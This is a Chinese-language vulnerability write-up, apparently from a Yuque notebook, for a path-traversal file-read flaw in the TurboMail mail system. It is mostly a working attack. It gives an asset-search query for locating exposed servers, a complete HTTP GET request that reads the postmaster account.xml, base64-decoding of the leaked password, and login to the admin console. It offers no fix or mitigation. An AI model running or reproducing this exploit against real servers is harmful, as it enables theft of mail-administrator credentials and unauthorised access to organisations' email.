# TurboMail 邮件系统 viewfile 文件读取漏洞

# 一、漏洞简介
广州拓波软件科技有限公司TurboMail 邮件系统 viewfile 文件读取漏洞，攻击者可通过此漏洞读取账户密码，从而登录后台进一步利用。

# 二、影响版本
+ TurboMail 邮件系统 

# 三、资产测绘
+ hunter`web.body="maintlogin.jsp" && web.body="/mailmain?type=logout"`
+ 特征

![1703260614409-67417cea-6ca3-44cc-ad4a-9ef98c998a10.png](./img/6F2qdw-ilKskSp6w/1703260614409-67417cea-6ca3-44cc-ad4a-9ef98c998a10-727801.png)

# 四、漏洞复现
1. 通过poc读取账号密码

```java
GET /viewfile?type=cardpic&mbid=1&msgid=2&logtype=3&view=true&cardid=/accounts/root/postmaster&cardclass=../&filename=/account.xml HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Blade-Auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwicG9zdF9pZCI6IjExMjM1OTg4MTc3Mzg2NzUyMDEiLCJ1c2VyX2lkIjoiMTEyMzU5ODgyMTczODY3NTIwMSIsInJvbGVfaWQiOiIxMTIzNTk4ODE2NzM4Njc1MjAxIiwidXNlcl9uYW1lIjoiYWRtaW4iLCJuaWNrX25hbWUiOiLnrqHnkIblkZgiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzYWJlciJ9.UHWWVEc6oi6Z6_AC5_WcRrKS9fB3aYH7XZxL9_xH-yIoUNeBrFoylXjGEwRY3Dv7GJeFnl5ppu8eOS3YYFqdeQ
Upgrade-Insecure-Requests: 1
```

![1703260773166-a588ef0c-2a56-4b0b-bb52-4e57d2f18feb.png](./img/6F2qdw-ilKskSp6w/1703260773166-a588ef0c-2a56-4b0b-bb52-4e57d2f18feb-271259.png)

2. 密码为base64加密，去掉=号后面解密

```java
Y2hlbHNlYTUzMDUzNjQ5NQ=3D=3D
Y2hlbHNlYTUzMDUzNjQ5NQ
```

![1703261028456-e47d326e-0092-4521-a34c-e8cae2a8a7ca.png](./img/6F2qdw-ilKskSp6w/1703261028456-e47d326e-0092-4521-a34c-e8cae2a8a7ca-482506.png)

3. 通过获取到的账号密码登录系统

```java
/maintlogin.jsp
```

![1703261079028-7b0ea268-948d-4b03-ada0-7aa983833032.png](./img/6F2qdw-ilKskSp6w/1703261079028-7b0ea268-948d-4b03-ada0-7aa983833032-995619.png)

![1703261120667-59e7ac2f-9576-4846-8ff1-8c6e94414883.png](./img/6F2qdw-ilKskSp6w/1703261120667-59e7ac2f-9576-4846-8ff1-8c6e94414883-426450.png)



> 更新: 2024-02-29 23:57:46  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ca5k7x5pqtitv191>